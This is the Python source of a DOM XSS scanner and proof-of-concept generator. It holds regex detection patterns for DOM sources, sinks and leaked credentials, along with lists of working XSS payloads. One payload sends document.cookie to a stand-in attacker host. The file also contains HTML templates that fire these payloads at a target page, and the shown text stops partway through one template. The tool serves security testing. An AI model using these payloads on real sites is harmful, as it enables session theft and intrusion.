#!/usr/bin/env python3
"""
DOM-Based Vulnerability Scanner & XSS PoC Generator
Developed by Vishal Bharad

Version: 2.0
"""

import re
import os
import sys
import json
import hashlib
import logging
import argparse
import urllib.parse
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import tldextract
import jsbeautifier
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

# ─────────────────────────────────────────────
# Configuration & Data Classes
# ─────────────────────────────────────────────

@dataclass
class VulnFinding:
    vuln_type: str
    severity: str  # critical, high, medium, low, info
    source: str
    js_file: str
    line_number: int
    code_snippet: str
    context: str
    description: str
    poc_html: str = ""
    cwe_id: str = ""
    remediation: str = ""
    confirmed: bool = False  # True only when XSS was dynamically verified (e.g., alert triggered)

@dataclass
class ScanResult:
    target_url: str
    js_files: List[str] = field(default_factory=list)
    inline_scripts: List[str] = field(default_factory=list)
    findings: List[VulnFinding] = field(default_factory=list)
    scan_time: str = ""
    total_js_size: int = 0


# ─────────────────────────────────────────────
# DOM Vulnerability Patterns Database
# ─────────────────────────────────────────────

class VulnPatterns:
    """Comprehensive database of DOM-based vulnerability patterns."""

    # ── SOURCES: Where attacker-controlled data enters ──
    SOURCES = {
        "location": [
            r"location\.href",
            r"location\.hash",
            r"location\.search",
            r"location\.pathname",
            r"location\.host",
            r"location\.hostname",
            r"location\.protocol",
            r"location\.origin",
            r"window\.location",
            r"document\.location",
            r"location\.toString\(\)",
        ],
        "document": [
            r"document\.URL",
            r"document\.documentURI",
            r"document\.referrer",
            r"document\.baseURI",
            r"document\.cookie",
            r"document\.domain",
            r"document\.title",
        ],
        "storage": [
            r"localStorage\.getItem\s*\(",
            r"localStorage\[",
            r"sessionStorage\.getItem\s*\(",
            r"sessionStorage\[",
            r"IndexedDB",
        ],
        "communication": [
            r"window\.name",
            r"event\.data",  # postMessage
            r"e\.data",
            r"evt\.data",
            r"msg\.data",
            r"message\.data",
        ],
        "url_params": [
            r"URLSearchParams",
            r"new\s+URL\(",
            r"url\.searchParams",
            r"getParameter\s*\(",
            r"getUrlParam\s*\(",
            r"getQueryString\s*\(",
            r"getUrlVar\s*\(",
            r"\$\.url\(",
            # Common redirect/login URL parameter extraction patterns
            r"(?:searchParams|params|urlParams)\.get\s*\(\s*['\"`](?:loginUrl|login_url|redirectUrl|redirect_url|returnUrl|return_url|callback|callbackUrl|callback_url|next|nextUrl|next_url|goto|redirect|redir|url|link|target|dest|destination|forward|fwd|return|continue|continueTo|rurl|RelayState|service|openid\.return_to)['\"`]\s*\)",
            # Regex-based URL parameter extraction
            r"(?:location\.search|location\.href|window\.location)[\s\S]{0,100}(?:split|match|exec|replace)\s*\(",
            # Direct URL param reading for navigation
            r"(?:decodeURIComponent|decodeURI|unescape)\s*\(\s*(?:.*(?:loginUrl|redirectUrl|returnUrl|callbackUrl|goto|redirect|next|url|dest))",
        ],
        "input_elements": [
            r"\.value",
            r"\.innerText",
            r"\.textContent",
            r"\.innerHTML",  # can also be a sink
        ],
    }

    # ── SINKS: Where data gets dangerously consumed ──
    SINKS = {
        "xss_injection": {
            "patterns": [
                r"\.innerHTML\s*=",
                r"\.innerHTML\s*\+=",
                r"\.outerHTML\s*=",
                r"\.outerHTML\s*\+=",
                r"document\.write\s*\(",
                r"document\.writeln\s*\(",
                r"\.insertAdjacentHTML\s*\(",
            ],
            "severity": "critical",
            "cwe": "CWE-79",
            "description": "DOM XSS via HTML injection sink",
            "remediation": "Use textContent/innerText instead of innerHTML, or sanitize with DOMPurify",
        },
        "js_execution": {
            "patterns": [
                r"eval\s*\(",
                r"Function\s*\(",
                r"new\s+Function\s*\(",
                r"setTimeout\s*\(\s*['\"`]",
                r"setTimeout\s*\(\s*[a-zA-Z_$]",
                r"setInterval\s*\(\s*['\"`]",
                r"setInterval\s*\(\s*[a-zA-Z_$]",
                r"execScript\s*\(",
                r"msSetImmediate\s*\(",
                r"\.setImmediate\s*\(",
            ],
            "severity": "critical",
            "cwe": "CWE-95",
            "description": "DOM XSS via JavaScript execution sink",
            "remediation": "Avoid eval() and string-based setTimeout/setInterval. Use function references.",
        },
        "script_injection": {
            "patterns": [
                r"\.src\s*=",
                r"\.href\s*=",
                r"\.action\s*=",
                r"\.formAction\s*=",
                r"\.data\s*=",  # object/embed
                r"\.codebase\s*=",
                r"\.dynsrc\s*=",
                r"\.lowsrc\s*=",
                r"\.background\s*=",
            ],
            "severity": "high",
            "cwe": "CWE-79",
            "description": "DOM XSS via URL/attribute manipulation",
            "remediation": "Validate URLs against an allowlist. Use URL() constructor for parsing.",
        },
        "jquery_xss": {
            "patterns": [
                r"\$\s*\(\s*['\"`]?\s*<",          # $('<div>') with potential injection
                r"\$\s*\(\s*[a-zA-Z_$]+\s*\)",     # $(variable) - DOM clobbering risk
                r"jQuery\s*\(\s*['\"`]?\s*<",
                r"\.html\s*\(",
                r"\.append\s*\(",
                r"\.prepend\s*\(",
                r"\.after\s*\(",
                r"\.before\s*\(",
                r"\.replaceWith\s*\(",
                r"\.wrap\s*\(",
                r"\.wrapAll\s*\(",
                r"\.wrapInner\s*\(",
                r"\$\.globalEval\s*\(",
            ],
            "severity": "high",
            "cwe": "CWE-79",
            "description": "DOM XSS via jQuery sink",
            "remediation": "Use .text() instead of .html(), $.parseHTML() with sanitization.",
        },
        "open_redirect": {
            "patterns": [
                r"location\s*=",
                r"location\.href\s*=",
                r"location\.replace\s*\(",
                r"location\.assign\s*\(",
                r"window\.open\s*\(",
                r"window\.navigate\s*\(",
                r"\.location\s*=",
            ],
            "severity": "medium",
            "cwe": "CWE-601",
            "description": "Potential Open Redirect via DOM manipulation",
            "remediation": "Validate redirect targets against an allowlist of trusted domains.",
        },
        "cookie_manipulation": {
            "patterns": [
                r"document\.cookie\s*=",
            ],
            "severity": "medium",
            "cwe": "CWE-565",
            "description": "Cookie manipulation via DOM",
            "remediation": "Set cookies server-side with HttpOnly, Secure, SameSite flags.",
        },
        "postmessage": {
            "patterns": [
                r"\.postMessage\s*\(",
                r"addEventListener\s*\(\s*['\"`]message['\"`]",
                r"\.on\s*\(\s*['\"`]message['\"`]",
                r"onmessage\s*=",
            ],
            "severity": "high",
            "cwe": "CWE-345",
            "description": "postMessage handler - potential for XSS if origin not validated",
            "remediation": "Always validate event.origin against an allowlist before processing event.data.",
        },
        "websocket": {
            "patterns": [
                r"new\s+WebSocket\s*\(",
                r"\.onmessage\s*=",
                r"ws:\/\/",
                r"wss:\/\/",
            ],
            "severity": "medium",
            "cwe": "CWE-345",
            "description": "WebSocket communication - potential for data injection",
            "remediation": "Validate all WebSocket messages. Use wss:// (TLS).",
        },
        "dom_clobbering": {
            "patterns": [
                r"document\.getElementById\s*\([^)]*\)\s*\.",
                r"document\.forms\[",
                r"document\.anchors\[",
                r"document\.images\[",
                r"document\.embeds\[",
            ],
            "severity": "medium",
            "cwe": "CWE-79",
            "description": "Potential DOM Clobbering vector",
            "remediation": "Avoid accessing DOM elements by name. Use unique IDs with getElementById().",
        },
        "prototype_pollution": {
            "patterns": [
                r"__proto__",
                r"constructor\s*\[",
                r"Object\.assign\s*\(",
                r"\.extend\s*\(",
                r"\$\.extend\s*\(",
                r"_\.merge\s*\(",
                r"_\.defaultsDeep\s*\(",
                r"\.merge\s*\(",
                r"\.defaults\s*\(",
                r"JSON\.parse\s*\(",
            ],
            "severity": "high",
            "cwe": "CWE-1321",
            "description": "Potential Prototype Pollution vector",
            "remediation": "Freeze prototypes, validate object keys, use Map instead of plain objects.",
        },
        "template_injection": {
            "patterns": [
                r"\.template\s*\(",
                r"Handlebars\.compile\s*\(",
                r"Mustache\.render\s*\(",
                r"_.template\s*\(",
                r"doT\.template\s*\(",
                r"ejs\.render\s*\(",
                r"`\$\{",  # template literals with potential injection
            ],
            "severity": "high",
            "cwe": "CWE-94",
            "description": "Client-side template injection",
            "remediation": "Never pass user input directly to template engines. Pre-compile templates.",
        },
        "dangerous_api": {
            "patterns": [
                r"\.createContextualFragment\s*\(",
                r"\.createHTMLDocument\s*\(",
                r"DOMParser\s*\(\s*\)\s*\.parseFromString",
                r"Range\s*\(\s*\)\s*\.createContextualFragment",
                r"Blob\s*\(\s*\[",
                r"createObjectURL\s*\(",
                r"\.srcdoc\s*=",
                r"\.sandbox\s*=",
            ],
            "severity": "medium",
            "cwe": "CWE-79",
            "description": "Dangerous DOM API usage",
            "remediation": "Sanitize all HTML before parsing. Use CSP to restrict blob: URLs.",
        },
        "javascript_protocol_injection": {
            "patterns": [
                # URL parameter value used as href/location without javascript: protocol filtering
                r"(?:location|location\.href|window\.location)\s*=\s*(?:params|searchParams|urlParams|getParam|getUrlParam|getQueryString|getParameter)\s*[\.\[\(]",
                r"(?:location|location\.href|window\.location)\s*=\s*(?:new\s+URL|new\s+URLSearchParams|url\.searchParams)",
                r"\.href\s*=\s*(?:params|searchParams|urlParams|getParam|getUrlParam|getQueryString|getParameter)\s*[\.\[\(]",
                r"\.href\s*=\s*(?:new\s+URL|new\s+URLSearchParams|url\.searchParams)",
                # Direct assignment from URL search params to href/location
                r"(?:location|location\.href|window\.location|\.href)\s*=\s*[a-zA-Z_$]+\s*(?://.*)?$",
                # Common redirect parameter names being read and used
                r"(?:loginUrl|login_url|redirectUrl|redirect_url|returnUrl|return_url|callback_url|callbackUrl|next_url|nextUrl|goto|redirect|redir|url|link|target|dest|destination|forward|fwd|return|continue|continueTo)\s*=\s*(?:new\s+URLSearchParams|params\.get|searchParams\.get|getParameter)",
                # URL parameter directly used in window.open
                r"window\.open\s*\(\s*(?:params|searchParams|urlParams|getParam|getUrlParam)[\.\[\(]",
                # Assigning URL param to anchor href
                r"\.setAttribute\s*\(\s*['\"`]href['\"`]\s*,\s*(?:params|searchParams|urlParams|getParam)[\.\[\(]",
            ],
            "severity": "critical",
            "cwe": "CWE-79",
            "description": "URL parameter value used as navigation target without javascript: protocol filtering - allows javascript: protocol XSS",
            "remediation": "Validate URL parameters used for navigation. Block javascript:, data:, and vbscript: protocols. Use URL allowlists or ensure URLs start with http:// or https://.",
        },
        "srcdoc_injection": {
            "patterns": [
                r"\.srcdoc\s*=\s*(?!['\"`]\s*$)",
                r"\.setAttribute\s*\(\s*['\"`]srcdoc['\"`]",
                r"createElement\s*\(\s*['\"`]iframe['\"`]\s*\)[\s\S]{0,200}\.srcdoc\s*=",
                r"\.srcdoc\s*=\s*[a-zA-Z_$]",
            ],
            "severity": "critical",
            "cwe": "CWE-79",
            "description": "iframe srcdoc set dynamically - allows HTML/script injection if user-controlled",
            "remediation": "Never assign user-controlled data to iframe.srcdoc. Sanitize with DOMPurify if dynamic content is needed.",
        },
    }

    # ── PostMessage-specific deep analysis patterns ──
    POSTMESSAGE_INSECURE = {
        "no_origin_check": {
            "pattern": r"addEventListener\s*\(\s*['\"`]message['\"`]\s*,\s*function\s*\([^)]*\)\s*\{(?:(?!origin).)*\}",
            "severity": "critical",
            "description": "postMessage handler without origin validation",
        },
        "wildcard_origin": {
            "pattern": r"\.postMessage\s*\([^,]+,\s*['\"`]\*['\"`]\s*\)",
            "severity": "high",
            "description": "postMessage sent with wildcard '*' targetOrigin",
        },
        "data_to_innerhtml": {
            "pattern": r"(?:event|e|evt|msg)\.data[\s\S]{0,100}\.innerHTML\s*=",
            "severity": "critical",
            "description": "postMessage data directly assigned to innerHTML",
        },
        "data_to_eval": {
            "pattern": r"(?:event|e|evt|msg)\.data[\s\S]{0,100}eval\s*\(",
            "severity": "critical",
            "description": "postMessage data passed to eval()",
        },
        "data_to_location": {
            "pattern": r"(?:event|e|evt|msg)\.data[\s\S]{0,200}location(?:\.href)?\s*=",
            "severity": "high",
            "description": "postMessage data used in location redirect",
        },
    }

    # ── Sensitive data exposure patterns ──
    SENSITIVE_DATA = {
        "api_keys": {
            "patterns": [
                r"(?:api[_-]?key|apikey|api_secret)\s*[:=]\s*['\"`]([a-zA-Z0-9_\-]{20,})['\"`]",
                r"(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*['\"`]([a-zA-Z0-9_\-\.]{20,})['\"`]",
                r"(?:secret[_-]?key|private[_-]?key)\s*[:=]\s*['\"`]([a-zA-Z0-9_\-]{20,})['\"`]",
            ],
            "severity": "high",
            "cwe": "CWE-798",
            "description": "Hardcoded API key/secret found",
        },
        "cloud_keys": {
            "patterns": [
                r"AKIA[0-9A-Z]{16}",  # AWS
                r"AIza[0-9A-Za-z_\-]{35}",  # Google API Key
                r"[0-9a-f]{32}-us[0-9]{1,2}",  # Mailchimp
                r"sk_live_[0-9a-zA-Z]{24,}",  # Stripe
                r"sq0atp-[0-9A-Za-z\-_]{22,}",  # Square
                r"ghp_[0-9a-zA-Z]{36}",  # GitHub PAT
                r"glpat-[0-9A-Za-z\-_]{20,}",  # GitLab PAT
            ],
            "severity": "critical",
            "cwe": "CWE-798",
            "description": "Cloud service credential detected",
        },
        "internal_urls": {
            "patterns": [
                r"https?://(?:localhost|127\.0\.0\.1|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})[:/]",
                r"https?://[a-zA-Z0-9_\-]+\.internal[:/\.]",
                r"https?://[a-zA-Z0-9_\-]+\.local[:/\.]",
                r"https?://[a-zA-Z0-9_\-]+\.corp[:/\.]",
                r"https?://[a-zA-Z0-9_\-]+\.intranet[:/\.]",
            ],
            "severity": "medium",
            "cwe": "CWE-200",
            "description": "Internal/private URL exposed in JavaScript",
        },
        "debug_info": {
            "patterns": [
                r"(?:console\.log|console\.debug|console\.info)\s*\(\s*['\"`](?:password|token|secret|key|auth|credential)",
                r"//\s*(?:TODO|FIXME|HACK|XXX|BUG).*(?:password|token|secret|key|auth)",
                r"(?:debug|verbose|trace)\s*[:=]\s*true",
            ],
            "severity": "low",
            "cwe": "CWE-200",
            "description": "Debug information or sensitive comments exposed",
        },
    }

    # ── Angular-specific patterns ──
    ANGULAR_PATTERNS = {
        "bypass_security": {
            "patterns": [
                r"bypassSecurityTrust(?:Html|Style|Script|Url|ResourceUrl)\s*\(",
                r"\.trustAs(?:Html|Css|Js|Url|ResourceUrl)\s*\(",
                r"\$sce\.trustAsHtml\s*\(",
                r"\$sce\.trustAs\s*\(",
            ],
            "severity": "critical",
            "cwe": "CWE-79",
            "description": "Angular security bypass - trusted HTML/URL injection",
            "remediation": "Avoid bypassSecurityTrust*. Use Angular's built-in sanitization.",
        },
        "ng_bind_html": {
            "patterns": [
                r"ng-bind-html\s*=",
                r"\[innerHTML\]\s*=",
                r"v-html\s*=",  # Vue.js equivalent
            ],
            "severity": "high",
            "cwe": "CWE-79",
            "description": "Framework HTML binding - potential XSS if unsanitized",
            "remediation": "Ensure data passed to HTML bindings is sanitized.",
        },
    }

    # ── React-specific patterns ──
    REACT_PATTERNS = {
        "dangerous_html": {
            "patterns": [
                r"dangerouslySetInnerHTML\s*=\s*\{",
                r"dangerouslySetInnerHTML\s*:\s*\{",
            ],
            "severity": "high",
            "cwe": "CWE-79",
            "description": "React dangerouslySetInnerHTML usage",
            "remediation": "Avoid dangerouslySetInnerHTML. Use DOMPurify if unavoidable.",
        },
        "href_javascript": {
            "patterns": [
                r"href\s*=\s*\{[^}]*(?:location|window|document|user|input|param|query)",
            ],
            "severity": "medium",
            "cwe": "CWE-79",
            "description": "Dynamic href with potential user-controlled input in React",
            "remediation": "Validate URLs. Block javascript: protocol in href values.",
        },
    }


# ─────────────────────────────────────────────
# XSS PoC Generator
# ─────────────────────────────────────────────

class PoCGenerator:
    """Generates Proof-of-Concept HTML files for confirmed DOM XSS vectors."""

    PAYLOADS = {
        "location_hash": [
            '#<img src=x onerror=alert(document.domain)>',
            '#"><svg/onload=alert(document.domain)>',
            '#javascript:alert(document.domain)',
            '#\'-alert(document.domain)-\'',
            '#\\\'-alert(document.domain)//\\',
        ],
        "location_search": [
            '?q=<img src=x onerror=alert(document.domain)>',
            '?search="><svg/onload=alert(document.domain)>',
            '?redirect=javascript:alert(document.domain)',
            '?callback=alert(document.domain)',
            '?name=\'-alert(document.domain)-\'',
        ],
        "javascript_protocol": [
            'javascript:alert(document.domain)',
            'javascript:alert(1337)',
            'JavaScript:alert(document.domain)',
            'java%0ascript:alert(document.domain)',
            'java%09script:alert(document.domain)',
            'java%0dscript:alert(document.domain)',
            'javascript:document.body.appendChild(document.createElement("iframe")).srcdoc="<script>alert(document.domain)<\\/script>"',
            'javascript:void(document.body.innerHTML="<img src=x onerror=alert(document.domain)>")',
            'javascript:fetch("https://ATTACKER.COM/?c="+document.cookie)',
            'data:text/html,<script>alert(document.domain)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
            'vbscript:msgbox(1)',
            'javascript:eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))',
            'javascript:document.body.appendChild(document.createElement("iframe")).srcdoc=\'<script>alert(1337)<\\/script>\'',
        ],
        "document_referrer": [
            '<img src=x onerror=alert(document.domain)>',
        ],
        "window_name": [
            '<img src=x onerror=alert(document.domain)>',
            '"><svg/onload=alert(document.domain)>',
        ],
        "postmessage": [
            '<img src=x onerror=alert(document.domain)>',
            '{"type":"xss","data":"<img src=x onerror=alert(document.domain)>"}',
            'javascript:alert(document.domain)',
        ],
        "eval_injection": [
            'alert(document.domain)',
            "alert(document.domain)//",
            "1;alert(document.domain)",
        ],
        "prototype_pollution": [
            '?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>',
            '?constructor[prototype][innerHTML]=<img src=x onerror=alert(document.domain)>',
            '#__proto__[test]=polluted',
        ],
    }

    @staticmethod
    def generate_location_hash_poc(target_url: str, finding: VulnFinding) -> str:
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["location_hash"])
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC - Location Hash - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        .payload-list {{ list-style: none; padding: 0; }}
        .payload-list li {{ background: #0d1117; margin: 5px 0; padding: 10px; border-radius: 5px; cursor: pointer; border: 1px solid #30363d; }}
        .payload-list li:hover {{ border-color: #e94560; }}
        #result {{ margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }}
        .severity-critical {{ color: #ff0000; font-weight: bold; }}
        .severity-high {{ color: #ff6600; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DOM XSS PoC - Location Hash Injection</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
            Unauthorized use is illegal and unethical.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td class="severity-{finding.severity}">{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Context:</h3>
        <div class="code">{finding.context}</div>

        <h3>Test Payloads:</h3>
        <ul class="payload-list" id="payloadList"></ul>

        <button onclick="testAllPayloads()">🚀 Test All Payloads</button>
        <button onclick="openManualTest()">🔧 Manual Test</button>
        <button onclick="copyReport()">📋 Copy Report</button>

        <div id="result"></div>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function init() {{
            const list = document.getElementById('payloadList');
            payloads.forEach((p, i) => {{
                const li = document.createElement('li');
                li.textContent = p;
                li.onclick = () => testPayload(p, i);
                list.appendChild(li);
            }});
        }}

        function testPayload(payload, index) {{
            const testUrl = targetUrl + payload;
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.style.background = '#16213e';
            resultDiv.innerHTML = `
                <h3>Testing Payload #${{index + 1}}</h3>
                <p><strong>URL:</strong></p>
                <div class="code">${{testUrl}}</div>
                <p>Opening in new window... Check for alert popup.</p>
                <p><small>If blocked by popup blocker, copy the URL and paste in a new tab.</small></p>
            `;
            window.open(testUrl, '_blank');
        }}

        function testAllPayloads() {{
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.style.background = '#16213e';
            let html = '<h3>All Test URLs:</h3>';
            payloads.forEach((p, i) => {{
                const testUrl = targetUrl + p;
                html += `<p><strong>Payload #${{i+1}}:</strong></p><div class="code">${{testUrl}}</div>`;
            }});
            html += '<p>Copy and test each URL individually in your browser.</p>';
            resultDiv.innerHTML = html;
        }}

        function openManualTest() {{
            const payload = prompt('Enter custom payload (will be appended to URL hash):', '#<img src=x onerror=alert(1)>');
            if (payload) {{
                const testUrl = targetUrl + payload;
                window.open(testUrl, '_blank');
            }}
        }}

        function copyReport() {{
            const report = `DOM XSS Vulnerability Report
=============================
Target: ${{targetUrl}}
Type: {finding.vuln_type}
Severity: {finding.severity.upper()}
CWE: {finding.cwe_id}
File: {finding.js_file}
Line: {finding.line_number}
Description: {finding.description}
Remediation: {finding.remediation}

Vulnerable Code:
{finding.code_snippet}

Test Payloads:
${{payloads.map((p,i) => `${{i+1}}. ${{targetUrl}}${{p}}`).join('\\n')}}
`;
            navigator.clipboard.writeText(report).then(() => {{
                alert('Report copied to clipboard!');
            }});
        }}

        init();
    </script>
</body>
</html>"""

    @staticmethod
    def generate_postmessage_poc(target_url: str, finding: VulnFinding) -> str:
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["postmessage"])
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC - postMessage - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        #log {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: monospace; min-height: 100px; margin: 10px 0; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }}
        textarea {{ width: 100%; height: 80px; background: #0d1117; color: #e0e0e0; border: 1px solid #30363d; border-radius: 5px; padding: 10px; font-family: monospace; }}
        .severity-critical {{ color: #ff0000; font-weight: bold; }}
        .severity-high {{ color: #ff6600; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
        iframe {{ width: 100%; height: 400px; border: 1px solid #30363d; border-radius: 5px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DOM XSS PoC - postMessage Exploitation</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
            Unauthorized use is illegal and unethical.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td class="severity-{finding.severity}">{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Target iframe:</h3>
        <iframe id="targetFrame" src="{target_url}"></iframe>

        <h3>Custom Message:</h3>
        <textarea id="customMsg" placeholder="Enter custom postMessage payload...">&lt;img src=x onerror=alert(document.domain)&gt;</textarea>

        <br>
        <button onclick="sendCustomMessage()">📨 Send Custom Message</button>
        <button onclick="sendAllPayloads()">🚀 Send All Payloads</button>
        <button onclick="clearLog()">🗑️ Clear Log</button>
        <button onclick="copyReport()">📋 Copy Report</button>

        <h3>Log:</h3>
        <div id="log"></div>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function log(msg) {{
            const logDiv = document.getElementById('log');
            const timestamp = new Date().toISOString().substr(11, 8);
            logDiv.textContent += `[${{timestamp}}] ${{msg}}\\n`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }}

        function sendCustomMessage() {{
            const msg = document.getElementById('customMsg').value;
            const frame = document.getElementById('targetFrame');
            try {{
                frame.contentWindow.postMessage(msg, '*');
                log(`Sent: ${{msg}}`);
            }} catch(e) {{
                log(`Error: ${{e.message}}`);
            }}
        }}

        function sendAllPayloads() {{
            const frame = document.getElementById('targetFrame');
            payloads.forEach((p, i) => {{
                setTimeout(() => {{
                    try {{
                        frame.contentWindow.postMessage(p, '*');
                        log(`Payload #${{i+1}} sent: ${{p}}`);
                    }} catch(e) {{
                        log(`Payload #${{i+1}} error: ${{e.message}}`);
                    }}
                }}, i * 1000);
            }});
        }}

        function clearLog() {{
            document.getElementById('log').textContent = '';
        }}

        function copyReport() {{
            const report = `DOM XSS via postMessage - Vulnerability Report
================================================
Target: ${{targetUrl}}
Type: {finding.vuln_type}
Severity: {finding.severity.upper()}
CWE: {finding.cwe_id}
File: {finding.js_file}
Line: {finding.line_number}
Description: {finding.description}
Remediation: {finding.remediation}

Vulnerable Code:
{finding.code_snippet}

Reproduction Steps:
1. Host this PoC HTML file on an attacker-controlled server
2. The iframe loads the target page
3. postMessage payloads are sent to the target window
4. If vulnerable, the XSS payload executes in the target origin

Test Payloads:
${{payloads.map((p,i) => `${{i+1}}. ${{p}}`).join('\\n')}}
`;
            navigator.clipboard.writeText(report).then(() => {{
                alert('Report copied to clipboard!');
            }});
        }}

        // Listen for any messages back from the target
        window.addEventListener('message', function(e) {{
            log(`Received message from ${{e.origin}}: ${{JSON.stringify(e.data).substring(0, 200)}}`);
        }});

        log('PoC loaded. Target iframe loading...');
        document.getElementById('targetFrame').onload = function() {{
            log('Target iframe loaded. Ready to send messages.');
        }};
    </script>
</body>
</html>"""

    @staticmethod
    def generate_window_name_poc(target_url: str, finding: VulnFinding) -> str:
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["window_name"])
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC - window.name - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DOM XSS PoC - window.name Injection</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td class="severity-{finding.severity}">{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Attack Flow:</h3>
        <div class="info-box">
            <ol>
